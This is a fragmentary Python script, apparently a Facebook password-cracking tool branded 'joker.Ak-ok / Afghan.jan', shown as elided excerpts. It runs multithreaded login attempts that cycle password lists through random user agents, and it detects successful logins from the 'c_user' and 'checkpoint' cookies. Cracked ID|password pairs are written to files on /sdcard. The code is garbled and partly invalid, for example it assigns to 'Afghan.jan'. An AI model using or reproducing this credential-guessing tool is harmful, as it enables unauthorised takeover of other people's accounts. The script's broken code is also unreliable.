...
try:
	...
	os.system('python Afghan.jan.py')
ugen = []
...
def uaku():
	try:
		...
		a=requests.get('https://www.facebook.com/asadullah.shirzad.56').text
		ua=open('.bbnew.txt','w')
...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> joker.Ak-ok/🇦🇫 TEAM  VERSION :\x1b[1;92m 1.1 ')
			linex()
			os.system(f'xdg-open https://www.facebook.com/asadullah.shirzad.56')
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/Afghan.jan.txt')
				linex()
				...
				with tred(max_workers=90) as crack_submit:
					...
					for user in fo:
						...
						if mthd in ['1','01']:
							...
							os.system("xdg-open https://www.facebook.com/asadullah.shirzad.56?mibextid=ZbWKwL")
				...
				os.system(f'xdg-open https://www.facebook.com/asadullah.shirzad.56');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[joker.Ak-ok / 🇦🇫] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			Afghan.jan=session.cookies.get_dict().keys()
			if "c_user" in Afghan.jan:
				print('\r\r\033[1;31m[Afghan.jan-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/Afghan.jan-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in Afghan.jan:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[Afghan.jan-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/Afghan.jan-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[joker.Ak-ok / 🇦🇫] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in Afghan.jan:
				...
				print('\r\r\033[1;32m[Afghan.jan-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[Afghan.jan-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mjoker.Ak-ok / 🇦🇫\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[Afghan.jan-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[Afghan.jan-#5D00FFOK] '+cid+' | '+ps+'\33[0;97m')
